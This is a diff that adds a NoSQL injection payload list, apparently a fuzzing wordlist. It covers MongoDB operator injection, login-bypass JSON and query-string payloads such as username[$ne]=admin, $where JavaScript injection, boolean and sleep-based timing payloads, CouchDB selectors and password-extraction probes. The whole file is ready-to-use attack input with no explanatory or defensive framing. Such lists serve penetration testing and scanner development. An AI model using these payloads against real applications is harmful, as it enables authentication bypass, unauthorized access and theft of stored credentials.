@@ -1,0 +1,76 @@
+# MongoDB Authentication Bypass
+{"$gt": ""}
+{"$ne": ""}
+{"$gt": null}
+{"$ne": null}
+{"$exists": true}
+{"$regex": ".*"}
+{"$where": "1==1"}
+{"$or": [{"a": 1}, {"b": 1}]}
+
+# MongoDB Operator Injection
+$gt
+$ne
+$lt
+$gte
+$lte
+$in
+$nin
+$regex
+$exists
+$where
+$or
+$and
+$not
+
+# URL-encoded variants
+%24gt
+%24ne
+%24lt
+%24regex
+%24where
+%24or
+%24exists
+
+# JSON injection payloads
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+
+# Array injection
+username[$ne]=admin&password[$ne]=admin
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+
+# Where clause injection
+"; return true; var x="
+'; return true; var x='
+1'; return true; '
+1"; return true; "
+{$where: "this.password.match(/.*/)"}
+
+# Boolean-based
+true, $where: '1 == 1'
+, $or: [ {}, { 'a': 'a' } ]
+$where: '1 == 1'
+'; return '' == '
+" || 1==1 || "
+' || 1==1 || '
+|| 1==1
+' || '1'=='1
+" || "1"=="1
+
+# Time-based (sleep detection)
+{"$where": "sleep(5000)"}
+{"$where": "function() { sleep(5000); return true; }"}
+$where: function() { sleep(5000); return true; }
+
+# CouchDB specific
+{"selector": {"_id": {"$gt": null}}}
+{"selector": {"password": {"$regex": ".*"}}}
+
+# Data extraction attempts
+{"$where": "this.password"}
+{"$where": "this.username == 'admin'"}
